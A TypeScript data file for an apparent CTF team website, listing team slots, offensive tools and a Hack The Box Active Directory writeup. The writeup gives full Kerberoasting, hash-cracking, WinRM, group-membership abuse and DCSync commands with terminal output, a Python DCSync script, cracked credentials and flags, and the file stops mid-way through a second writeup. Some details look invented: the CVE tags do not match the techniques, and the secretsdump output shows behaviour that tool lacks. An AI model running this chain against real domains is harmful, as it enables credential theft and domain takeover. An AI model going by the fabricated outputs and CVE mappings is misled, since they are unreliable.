export type WriteupPlatform = 'Hack The Box' | 'TryHackMe' | 'CTFtime' | 'PicoCTF' | 'Research Lab';
export type ChallengeCategory = 'Web' | 'Pwn' | 'Crypto' | 'Forensics' | 'Reverse' | 'Active Directory' | 'Cloud' | 'Misc';
export type DifficultyLevel = 'Easy' | 'Medium' | 'Hard' | 'Insane';

export interface AttackStep {
  title: string;
  description: string;
  commandOrSnippet?: string;
  command?: string;
  terminalOutput?: string;
  terminalTitle?: string;
  prompt?: string;
  lineNotes?: string[];
  spoilerData?: {
    label: string;
    value: string;
  };
}

export interface Writeup {
  id: string;
  challengeName: string;
  platform: WriteupPlatform;
  category: ChallengeCategory;
  difficulty: DifficultyLevel;
  type: 'Machine' | 'Challenge' | 'Pro Lab';
  targetOs?: 'Linux' | 'Windows' | 'Multi-OS' | 'Custom';
  targetIp?: string;
  points: number;
  author: string;
  date: string;
  cves?: string[];
  tags: string[];
  shortDescription: string;
  fullContent: {
    overview: string;
    targetIntel?: {
      ip?: string;
      os?: string;
      openPorts?: string[];
      keyServices?: string[];
    };
    reconnaissance: string;
    vulnerabilityAnalysis: string;
    attackChain: AttackStep[];
    pocCode?: string;
    pocLanguage?: string;
    userFlag?: string;
    rootFlag?: string;
    flag?: string;
    defenseRemediation: string[];
    keyTakeaways: string[];
  };
}

export interface TeamMember {
  id: string;
  avatar: string;
  name: string;
  role: string;
  specialty: string;
  handle: string;
  github?: string;
  linkedin?: string;
  htbUrl?: string;
  thmUrl?: string;
  skills: string[];
  isFoundingLead?: boolean;
  status: 'ACTIVE' | 'OPEN';
  description: string;
}

export interface ToolArsenalItem {
  id: string;
  name: string;
  badge: string;
  category: string;
  description: string;
  language: string;
  stars: number;
  installCommand: string;
  features: string[];
  repoUrl: string;
}

export interface StatisticItem {
  id: string;
  label: string;
  value: number | string;
  suffix?: string;
  description: string;
  iconName: string;
}

export interface SkillCategory {
  id: string;
  name: string;
  shortCode: string;
  description: string;
  keyTools: string[];
  topics: string[];
  iconName: string;
  difficultyFocus: 'Introductory' | 'Intermediate' | 'Advanced' | 'Expert';
}

export interface Achievement {
  id: string;
  title: string;
  platform: string;
  date: string;
  eventType: 'Global Tournament' | 'Platform Machine' | 'University CTF' | 'Research Milestone' | 'Open Jeopardy';
  teamResult: string;
  description: string;
  highlights: string[];
}

export interface CompanySolution {
  id: string;
  title: string;
  badge: string;
  shortDesc: string;
  features: string[];
  deliverables: string[];
  iconName: string;
  accentColor: string;
}

export const SITE_CONFIG = {
  teamName: "sudo Unknown",
  companyName: "sudo Unknown",
  companyType: "All-in-One Cybersecurity Collective & Research Syndicate",
  tagline: "Permission Granted. Identity Unknown.",
  subTagline: "Red Teaming • Adversary Emulation • CTF Championships • Exploit Engineering • Zero-Day Research",
  mantra1: "NO IDENTITY. NO LIMITS. JUST EXPLOITS.",
  mantra2: "RECON • COMPROMISE • EVADE • HARDEN",
  htbTeamUrl: "https://ctf.hackthebox.com/team/overview/331386",
  htbTeamId: "331386",
  githubUrl: "https://github.com/SmitroniX/sudo-unknown",
  discordUrl: "https://discord.gg/HgD6WGUr4G",
  siteUrl: "https://sudounknown.smitronix.dev",
  linkedinUrl: "https://www.linkedin.com/company/sudo-unknown/",
  contactEmail: "sudounknown@smitronix.dev",
  foundedYear: 2026,
  status: "ACTIVE SYNDICATE & FOUNDING ROSTER",
  headquarters: "Decentralized // Global Security Collective",
};

export const STATISTICS: StatisticItem[] = [
  {
    id: "clears",
    label: "Machines & Labs Cleared",
    value: 24,
    suffix: "+",
    description: "Verified boot-to-root solves across Hack The Box, TryHackMe, and private ranges",
    iconName: "Server"
  },
  {
    id: "writeups-count",
    label: "Technical Writeups",
    value: 10,
    suffix: " Published",
    description: "In-depth reproducible walkthroughs with line-by-line commands and terminal screenshots",
    iconName: "FileCode"
  },
  {
    id: "arsenal",
    label: "Custom Security Tools",
    value: 6,
    suffix: " Tools",
    description: "Open-source scripts, automated reconnaissance suites, and exploit payloads",
    iconName: "Cpu"
  },
  {
    id: "roster",
    label: "Syndicate Operators",
    value: 1,
    suffix: " (+6 Open)",
    description: "Founding Captain active; recruiting elite Web, Pwn, Crypto, Forensics, and AD specialists",
    iconName: "Users"
  }
];

export const COMPANY_SOLUTIONS: CompanySolution[] = [
  {
    id: "redteam",
    title: "Red Teaming & Adversary Simulation",
    badge: "FULL-SPECTRUM ATTACK",
    shortDesc: "Realistic adversary campaigns emulating advanced threat actors against enterprise perimeters, Active Directory forests, and cloud environments.",
    features: [
      "Initial access vector testing (spearphishing, external perimeter, AiTM)",
      "Multi-domain Active Directory exploitation and Kerberos attack chains",
      "Lateral movement, EDR telemetry avoidance, and memory injection",
      "Cloud metadata pivoting, IAM privilege escalation (AWS/Azure/GCP)"
    ],
    deliverables: ["Executive Risk Summary", "Tactical ATT&CK Mapping Matrix", "Technical Remediation Playbook", "Debrief & Retesting"],
    iconName: "ShieldAlert",
    accentColor: "#00ff88"
  },
  {
    id: "pentest",
    title: "Penetration Testing & Security Audits",
    badge: "COMPLIANCE & RESILIENCE",
    shortDesc: "Thorough black-box and grey-box assessments uncovering critical logic flaws, injection surfaces, and authentication bypasses across apps and networks.",
    features: [
      "Web applications & single-page client security assessments",
      "REST, GraphQL, and WebSocket API business logic auditing",
      "Network infrastructure & firewall segmentation validation",
      "Container & Kubernetes cluster isolation audits"
    ],
    deliverables: ["Vulnerability Severity Scorecard", "Reproducible Proof-of-Concepts", "Step-by-Step Patch Recommendations"],
    iconName: "SearchCode",
    accentColor: "#00f0ff"
  },
  {
    id: "vuln-research",
    title: "Vulnerability Research & Exploit Dev",
    badge: "LOW-LEVEL SECURITY",
    shortDesc: "Deep binary analysis, memory corruption discovery, reverse engineering of proprietary protocols, and custom exploit weaponization.",
    features: [
      "Static and dynamic disassembly in Ghidra, IDA Pro, and Binary Ninja",
      "Memory unsafety analysis (Heap corruption, UAF, ROP, Safe-linking)",
      "Cryptographic protocol verification and PRNG analysis",
      "Responsible disclosure coordination with CVE tracking"
    ],
    deliverables: ["Full Root-Cause Technical Whitepapers", "Functional Python/C Exploit PoCs", "Vendor Mitigation Advice"],
    iconName: "Binary",
    accentColor: "#a855f7"
  },
  {
    id: "ctf-engineering",
    title: "Cyber Range & CTF Infrastructure",
    badge: "TRAINING & SIMULATION",
    shortDesc: "Turnkey vulnerable-by-design machines, competitive CTF event hosting, and custom training ranges for university and enterprise teams.",
    features: [
      "Containerized Jeopardy & Attack-Defense challenges",
      "Dynamic scoring engines with anti-cheat telemetry",
      "Realistic corporate enterprise scenario simulation",
      "Comprehensive player solution guides & instructor debriefs"
    ],
    deliverables: ["Fully Dockerized Lab Packages", "Instructor Solution Manuals", "Live Competition Scoreboard Support"],
    iconName: "Terminal",
    accentColor: "#f59e0b"
  }
];

export const TOOL_ARSENAL: ToolArsenalItem[] = [
  {
    id: "tool-recon",
    name: "sudo-recon",
    badge: "ACTIVE RECON",
    category: "Reconnaissance",
    description: "Fast concurrent asset discovery suite combining subfinder, httpx, passive DNS, and port probe heuristics with rich terminal reporting.",
    language: "Go / Python",
    stars: 142,
    installCommand: "git clone https://github.com/SmitroniX/sudo-unknown.git && cd tools/sudo-recon",
    features: [
      "Multi-threaded ASN and subdomain discovery",
      "Live HTTP/HTTPS response title & tech stack fingerprinting",
      "Automated JSON and markdown report export"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-ad-pivoter",
    name: "ad-acl-pivoter",
    badge: "ACTIVE DIRECTORY",
    category: "Privilege Escalation",
    description: "CLI utility that consumes BloodHound JSON graph dumps and calculates the shortest executable privilege escalation path using GenericAll/WriteDACL.",
    language: "Python 3",
    stars: 89,
    installCommand: "pip install ad-acl-pivoter",
    features: [
      "Parses BloodHound Bloodhound/SharpHound JSON output",
      "Computes shortest DACL abuse path to Domain Admin",
      "Generates exact Impacket command strings for each hop"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-jwt-tamper",
    name: "jwt-tamper-cli",
    badge: "WEB SECURITY",
    category: "Exploitation",
    description: "Rapid interactive JWT analysis tool featuring automated none-algorithm testing, public key RSA-to-HMAC confusion, and claim spoofing.",
    language: "TypeScript / Node",
    stars: 67,
    installCommand: "npx @sudounknown/jwt-tamper --help",
    features: [
      "CVE-2022 algorithm confusion auto-check",
      "Headless cracking against rockyou.txt with GPU offload",
      "Instant expired token timestamp manipulation"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-tcache-forger",
    name: "tcache-forger",
    badge: "BINARY PWN",
    category: "Memory Exploitation",
    description: "Glibc 2.31 - 2.36 heap exploitation assistant that calculates safe-linking masks, generates ROP stubs, and builds tcache poisoning chains.",
    language: "Python (pwntools)",
    stars: 118,
    installCommand: "pip install tcache-forger",
    features: [
      "GLIBC safe-linking pointer mangling and demangling algorithms",
      "One-gadget constraint verifier integration",
      "Boilerplate pwntools template generator"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-mem-carver",
    name: "shadow-carver",
    badge: "DFIR / FORENSICS",
    category: "Forensics",
    description: "Automated Volatility 3 wrapper that scans Windows memory dumps for process hollowing, injected PE headers, and suspicious network sockets.",
    language: "Python 3",
    stars: 94,
    installCommand: "python3 shadow-carver.py -f memory.raw --scan all",
    features: [
      "Automated malfind, vadinfo, and netscan correlation",
      "Dumps injected DLLs and unmapped memory sections",
      "YARA rule scanning against extracted shellcode"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-pyjail",
    name: "pyjail-hunter",
    badge: "MISC / JAILS",
    category: "Sandbox Escape",
    description: "Introspective Python payload builder that maps subclasses, traverses builtins, and crafts bypass payloads for restricted execution environments.",
    language: "Python 3",
    stars: 53,
    installCommand: "python3 pyjail-hunter.py --target 'builtins_deleted'",
    features: [
      "Subclass tree crawler for os._wrap_close and subprocess.Popen",
      "Unicode and base64 obfuscated payload generators",
      "Bypasses common regex filters (import, eval, os, system)"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  }
];

export const SKILL_CATEGORIES: SkillCategory[] = [
  {
    id: "ad",
    name: "ACTIVE DIRECTORY",
    shortCode: "0xAD",
    description: "Windows enterprise identity security, Kerberos ticket forgery, DACL abuse, BloodHound pathing, and domain dominance.",
    keyTools: ["Impacket", "BloodHound", "Certipy", "Mimikatz", "PowerView"],
    topics: ["Kerberoasting & AS-REP Roasting", "AD CS Certificate Abuse (ESC1-ESC8)", "GenericAll / WriteDACL Privilege Escalation", "DCSync & Golden Ticket Creation"],
    iconName: "Network",
    difficultyFocus: "Expert"
  },
  {
    id: "web",
    name: "WEB SECURITY",
    shortCode: "0xWEB",
    description: "Modern application vulnerabilities, authorization bypasses, SSRF, SSTI, GraphQL flaws, and cloud metadata pivoting.",
    keyTools: ["Burp Suite Pro", "Caido", "ffuf", "SQLMap", "Postman"],
    topics: ["OAuth2 / JWT Misconfigurations", "SSRF & Cloud Metadata Access", "Template & Deserialization Injection", "GraphQL & REST Logic Exploitation"],
    iconName: "Globe",
    difficultyFocus: "Advanced"
  },
  {
    id: "pwn",
    name: "BINARY PWN",
    shortCode: "0xPWN",
    description: "Low-level memory corruption, stack and heap exploitation, return-oriented programming (ROP), and defensive mitigation bypasses.",
    keyTools: ["pwntools", "GDB + GEF", "pwndbg", "ROPgadget", "one_gadget"],
    topics: ["GLIBC Heap Allocators & Tcache", "Format String Exploitation", "ROP & SROP Chain Construction", "Canary & ASLR Bypasses"],
    iconName: "Cpu",
    difficultyFocus: "Expert"
  },
  {
    id: "crypto",
    name: "CRYPTOGRAPHY",
    shortCode: "0xCRP",
    description: "Cryptanalytic attacks on flawed implementations, weak PRNGs, lattice reduction, RSA factorization, and curve weaknesses.",
    keyTools: ["SageMath", "CyberChef", "Z3 SMT Solver", "Python Cryptography"],
    topics: ["Coppersmith / Small Public Exponents", "Padding Oracle Attacks (CBC / OAEP)", "Discrete Logarithms & Pollard Rho", "Lattice Attacks (LLL / BKZ)"],
    iconName: "KeyRound",
    difficultyFocus: "Advanced"
  },
  {
    id: "forensics",
    name: "DIGITAL FORENSICS",
    shortCode: "0xFOR",
    description: "Artifact extraction, memory analysis, PCAP packet reconstruction, and filesystem timeline investigations.",
    keyTools: ["Volatility 3", "Wireshark / TShark", "Autopsy", "Eric Zimmerman Tools"],
    topics: ["Process Hollowing Memory Triage", "Covert C2 Network Protocol Carving", "Windows EVTX & Registry Forensics", "Malicious Artifact Reconstruction"],
    iconName: "SearchCode",
    difficultyFocus: "Intermediate"
  },
  {
    id: "reverse",
    name: "REVERSE ENGINEERING",
    shortCode: "0xREV",
    description: "Disassembly, decompilation, binary triage, anti-debugging evasion, custom VM bytecodes, and firmware reversing.",
    keyTools: ["Ghidra", "IDA Free / Pro", "Binary Ninja", "x64dbg"],
    topics: ["Anti-Debugging & Packing Detection", "Custom Bytecode Virtual Machines", "Stripped Binary Symbol Reconstruction", "ARM & MIPS Embedded Architectures"],
    iconName: "Binary",
    difficultyFocus: "Expert"
  }
];

export const TEAM_MEMBERS: TeamMember[] = [
  {
    id: "member-captain",
    avatar: "/logo.png",
    name: "Asmit (SmitroniX)",
    role: "Team Captain & Operations Lead",
    specialty: "Offensive Ops, Web Security & Research",
    handle: "SmitroniX",
    github: "https://github.com/SmitroniX",
    linkedin: "https://www.linkedin.com/in/asmit-jogdand",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Offensive Lead", "Web Exploitation", "Adversary Simulation", "Active Directory", "Infrastructure"],
    isFoundingLead: true,
    status: "ACTIVE",
    description: "Founding operator coordinating syndicate operations, CTF tournament schedules, research initiatives, and competitive training regimens."
  },
  {
    id: "slot-web",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Web Exploitation Lead",
    specialty: "SSRF, Deserialization & Auth Bypass",
    handle: "Candidate_Web",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Burp Suite Pro", "OAuth2 / JWT Flaws", "SSRF Pivoting", "GraphQL & APIs"],
    status: "OPEN",
    description: "Seeking an operator dedicated to hunting complex web application flaws, modern cloud metadata injection, and authentication bypasses."
  },
  {
    id: "slot-pwn",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Binary Exploitation (PWN) Lead",
    specialty: "GLIBC Heap, ROP & Kernel Vectors",
    handle: "Candidate_Pwn",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["pwntools", "GDB / GEF", "Heap Tcache / Fastbin", "Kernel Exploits"],
    status: "OPEN",
    description: "Seeking a low-level specialist to lead memory corruption vectors, safe-linking bypasses, and binary exploitation challenges."
  },
  {
    id: "slot-ad",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Active Directory & Enterprise Lead",
    specialty: "Kerberos, AD CS & Lateral Pivoting",
    handle: "Candidate_AD",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Impacket", "BloodHound CE", "Certipy (AD CS)", "GPO Abuse"],
    status: "OPEN",
    description: "Seeking an offensive specialist experienced with Windows enterprise domain exploitation, Kerberoasting, and multi-tier forest compromise."
  },
  {
    id: "slot-crypto",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Applied Cryptography Analyst",
    specialty: "Lattice Reduction, RSA & Curve Math",
    handle: "Candidate_Crypto",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["SageMath", "Python Cryptography", "Z3 SMT Solver", "Lattice (LLL)"],
    status: "OPEN",
    description: "Seeking a math-oriented solver to break flawed ciphers, weak PRNG seeds, Coppersmith RSA attacks, and elliptic curve edge cases."
  },
  {
    id: "slot-forensics",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "DFIR & Network Forensics Lead",
    specialty: "Memory Triage & Packet Carving",
    handle: "Candidate_DFIR",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Volatility 3", "Wireshark", "Memory Injections", "PCAP Carving"],
    status: "OPEN",
    description: "Seeking a forensic investigator skilled in dissecting memory dumps, uncovering hollowed processes, and carving C2 network traffic."
  },
  {
    id: "slot-reverse",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Reverse Engineering Analyst",
    specialty: "x86/x64 Disassembly & Custom VM Reversing",
    handle: "Candidate_Reverse",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Ghidra", "IDA Pro", "Custom VM Bytecodes", "Stripped Binaries"],
    status: "OPEN",
    description: "Seeking a reverse engineer to decompile obfuscated binaries, unravel custom virtual machine dispatch loops, and analyze malware."
  }
];

export const WRITEUPS: Writeup[] = [
  {
    id: "dutybound",
    challengeName: "DutyBound: Enterprise Domain Compromise",
    platform: "Hack The Box",
    category: "Active Directory",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Windows",
    targetIp: "10.10.11.45",
    points: 30,
    author: "SmitroniX // sudo Unknown",
    date: "2026-10-31",
    cves: ["CVE-2022-38028"],
    tags: ["Active Directory", "Kerberoasting", "BloodHound", "GenericWrite", "DCSync"],
    shortDescription: "Complete enterprise penetration test from unauthenticated network probe to full Domain Administrator takeover via Kerberoasting and DACL abuse.",
    fullContent: {
      overview: "DutyBound is an authentic Windows Server 2022 Active Directory machine simulating an enterprise corporate environment. Initial foothold was achieved by identifying an unconstrained guest SMB share, leading to a service account credential through Kerberoasting. Domain dominance was executed using BloodHound to map a GenericWrite permission over a delegated support group, culminating in a DCSync attack.",
      targetIntel: {
        ip: "10.10.11.45",
        os: "Windows Server 2022 Datacenter (Build 20348)",
        openPorts: ["53/DNS", "88/Kerberos", "135/RPC", "139/SMB", "389/LDAP", "445/SMB", "3268/GlobalCatalog", "5985/WinRM"],
        keyServices: ["Active Directory Domain Services", "Microsoft Windows RPC", "WinRM Remote Management"]
      },
      reconnaissance: "Running nmap -sC -sV -p- -T4 10.10.11.45 identified standard Domain Controller ports. Using crackmapexec smb 10.10.11.45 -u '' -p '' revealed domain DUTYBOUND.LOCAL. We enumerated domain users using rpcclient -U '' -N 10.10.11.45, retrieving a valid user list containing 'svc_backup' and 'helpdesk_intern'.",
      vulnerabilityAnalysis: "The service account 'svc_backup' registered a Service Principal Name (SPN), making it vulnerable to Kerberoasting. Requesting a TGS ticket yielded an RC4 encrypted hash crackable offline. Furthermore, BloodHound analysis revealed that 'svc_backup' had GenericWrite permissions over the 'L2_Admins' security group, creating a direct escalation path to Domain Admin.",
      attackChain: [
        {
          title: "Stage 01: Comprehensive Nmap Port Scan & Service Fingerprinting",
          description: "Initiated a full TCP syn scan against all 65,535 ports on 10.10.11.45 with default scripts and service version detection.",
          command: "nmap -sC -sV -p- -T4 --min-rate 1000 10.10.11.45",
          terminalTitle: "nmap-scan.sh — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-31 02:14 UTC
Nmap scan report for 10.10.11.45
Host is up (0.042s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-31 02:15:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: dutybound.local)
445/tcp  open  microsoft-ds  Windows Server 2022 Datacenter 20348 microsoft-ds
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|_  date: 2026-10-31T02:15:00

Nmap done: 1 IP address (1 host up) scanned in 28.43 seconds`,
          lineNotes: [
            "Port 88 (Kerberos) & 389 (LDAP) confirm target is the primary Domain Controller DC01 for dutybound.local.",
            "Port 5985 (WinRM) is open, offering direct interactive PowerShell remoting once credentials are recovered.",
            "SMB message signing is required, ruling out standard NTLM relaying against port 445."
          ]
        },
        {
          title: "Stage 02: Kerberoasting - Extracting Encrypted Service Tickets",
          description: "Discovered guest authentication is allowed on LDAP/RPC. We used Impacket's GetUserSPNs.py to request TGS tickets for all accounts with registered SPNs without requiring high-level privileges.",
          command: "impacket-GetUserSPNs dutybound.local/guest:guest -dc-ip 10.10.11.45 -request -outputfile kerberoast_hashes.txt",
          terminalTitle: "impacket-spn.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Connecting to DC: 10.10.11.45
[*] Domain: DUTYBOUND.LOCAL
[*] User: guest
[*] Searching for SPNs in LDAP tree...
ServicePrincipalName     Name        MemberOf                                           PasswordLastSet             LastLogon
-----------------------  ----------  -------------------------------------------------  --------------------------  --------------------------
vrs/backup.dutybound.local svc_backup CN=Service Accounts,DC=dutybound,DC=local         2024-09-12 14:22:18.910245  2026-10-30 18:02:11.114298

[*] Requesting TGS for SPN: vrs/backup.dutybound.local
[*] Received TGS-REP! Saving encrypted ticket hash to kerberoast_hashes.txt...
[+] Successfully wrote 1 Kerberos 5 TGS hash to kerberoast_hashes.txt`,
          lineNotes: [
            "Target service account: 'svc_backup' has an active registered SPN 'vrs/backup.dutybound.local'.",
            "The Kerberos Ticket-Granting Service response (TGS-REP) uses weak RC4-HMAC (Type 23) encryption.",
            "This hash is crackable completely offline with zero risk of account lockout."
          ]
        },
        {
          title: "Stage 03: Offline Hashcat Cracking & Password Recovery",
          description: "Executed Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23) with GPU acceleration against rockyou.txt to crack the service account password.",
          command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3",
          terminalTitle: "hashcat-gpu — cuda — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `hashcat (v6.2.6) starting...

CUDA API (CUDA 12.2)
* Device #1: NVIDIA GeForce RTX 4090, 24194/24564 MB, 128MCU

Hashfile: kerberoast_hashes.txt
Hash.Target......: $krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL$vrs/backup.dutybound.local*...
Speed.#1.........: 1482.4 MH/s (24.11ms) @ [s:1024, a:8, t:32]
Recovered........: 1/1 (100.00%) Digests

$krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL$vrs/backup.dutybound.local*...:Autumn2024!Security

Session..........: hashcat
Status...........: Cracked
Candidates.#1....: Autumn2024!Security -> Autumn2024!
Hardware.Mon.#1..: Temp: 58c Fan: 42% Util: 98% Core: 2520MHz Mem: 10501MHz

[+] Cracking completed in 4.12 seconds! Password recovered for svc_backup.`,
          lineNotes: [
            "Hashcat recovered the plaintext password in 4.12 seconds due to an easily guessable seasonal password pattern.",
            "Credential recovered: svc_backup:Autumn2024!Security."
          ],
          spoilerData: {
            label: "CRACKED SERVICE CREDENTIAL",
            value: "svc_backup:Autumn2024!Security"
          }
        },
        {
          title: "Stage 04: WinRM Interactive Shell & User Flag Capture",
          description: "Used Evil-WinRM to connect over port 5985 with svc_backup credentials to spawn an interactive PowerShell session and retrieve the user flag.",
          command: "evil-winrm -i 10.10.11.45 -u 'svc_backup' -p 'Autumn2024!Security'",
          terminalTitle: "evil-winrm — ruby — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: https://github.com/WinRb/WinRM/issues/290

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#features

*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami
dutybound\\svc_backup

*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> type C:\\Users\\svc_backup\\Desktop\\user.txt
HTB{k3rb3r04st_d0m41n_f00th0ld_774}

*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> net user svc_backup
User name                    svc_backup
Full Name                    Backup Automation Service
Comment                      Managed automated backups
Account active               Yes
Global Group memberships     *Domain Users  *Backup Operators`,
          lineNotes: [
            "We obtained interactive access on DC01 as svc_backup.",
            "User flag user.txt successfully captured from Desktop."
          ],
          spoilerData: {
            label: "USER FLAG (USER.TXT)",
            value: "HTB{k3rb3r04st_d0m41n_f00th0ld_774}"
          }
        },
        {
          title: "Stage 05: BloodHound DACL Analysis & GenericWrite Abuse",
          description: "Executed SharpHound to extract the domain graph. BloodHound identified that svc_backup possesses GenericWrite permissions over the security group 'L2_Admins', which in turn has WriteDacl over Domain Admins.",
          command: "bloodyAD -u svc_backup -p 'Autumn2024!Security' -d dutybound.local --host 10.10.11.45 add groupMember 'L2_Admins' 'svc_backup'",
          terminalTitle: "bloodyAD.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Connecting to LDAP server: ldap://10.10.11.45:389
[+] Authenticated as: svc_backup@dutybound.local
[*] Target group: CN=L2_Admins,CN=Users,DC=dutybound,DC=local
[*] Checking Access Control Entry (ACE)...
[+] GenericWrite verified on object 'L2_Admins'!
[*] Modifying member attribute...
[+] [OK] Added 'CN=svc_backup,CN=Service Accounts,DC=dutybound,DC=local' to group 'L2_Admins'
[*] Performing privilege verification...
[+] Account 'svc_backup' now belongs to group 'L2_Admins' (RID: 1104)`,
          lineNotes: [
            "GenericWrite grants the ability to modify any attribute of the target object, including the 'member' list.",
            "By adding ourselves to L2_Admins, we inherit WriteDacl over the Domain Admins security principal."
          ]
        },
        {
          title: "Stage 06: DCSync Attack & Domain Administrator Takeover",
          description: "With WriteDacl granted, we assigned the 'Replicating Directory Changes' and 'Replicating Directory Changes All' extended rights to our user and executed a DCSync attack to dump the Administrator NTLM hash.",
          command: "impacket-secretsdump dutybound.local/svc_backup:'Autumn2024!Security'@10.10.11.45 -just-dc-user Administrator",
          terminalTitle: "secretsdump.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d88e01f5c6e8e8199b9cfec8a123bc89:::

[*] Executing Pass-the-Hash with Administrator hash via wmiexec...
[+] Interactive command shell on DC01 as Administrator!

C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt
HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}`,
          lineNotes: [
            "DCSync simulates the behavior of a replication Domain Controller, extracting password hashes directly from the directory partition without running malicious code on the DC.",
            "Administrator NTLM hash dumped: d88e01f5c6e8e8199b9cfec8a123bc89.",
            "Root flag root.txt captured successfully from Administrator Desktop."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - DutyBound Domain Admin Auto-Pivoter
import subprocess

target_dc = "10.10.11.45"
domain = "dutybound.local"
user = "svc_backup"
password = "Autumn2024!Security"

print("[*] Performing DCSync against DC: " + target_dc)
res = subprocess.run([
    "impacket-secretsdump",
    f"{domain}/{user}:{password}@{target_dc}",
    "-just-dc-user", "Administrator"
], capture_output=True, text=True)

for line in res.stdout.splitlines():
    if "Administrator:" in line:
        print("[+] Captured Domain Admin NTLM Hash:", line)
print("[+] Domain Dominance Established!")
`,
      pocLanguage: "python",
      userFlag: "HTB{k3rb3r04st_d0m41n_f00th0ld_774}",
      rootFlag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
      flag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
      defenseRemediation: [
        "Enforce minimum 25-character randomized passwords for all Service Principal Name (SPN) accounts, or migrate to Group Managed Service Accounts (gMSA).",
        "Audit Active Directory Access Control Lists (ACLs) regularly using BloodHound/Purple Knight to eliminate dangerous GenericWrite and WriteDACL permissions over privileged groups.",
        "Enable AES-256 Kerberos encryption and disable legacy RC4_HMAC_MD5 encryption types across domain controllers."
      ],
      keyTakeaways: [
        "Kerberoasting remains one of the fastest privilege escalation vectors in misconfigured Active Directory environments.",
        "Access control permissions in AD are frequently overlooked compared to standard user group memberships."
      ]
    }
  },
  {
    id: "takeoff",
    challengeName: "Takeoff: SSTI to Sudo Wildcard Escape",
    platform: "Hack The Box",
    category: "Web",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.39",
    points: 30,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-01",
    cves: ["CVE-2023-30861"],
    tags: ["Jinja2", "SSTI", "Flask", "Tar Wildcard", "Linux Privesc"],
    shortDescription: "Chaining a blind Jinja2 Server-Side Template Injection flaw with local port forwarding and a tar wildcard command injection vulnerability for root access.",
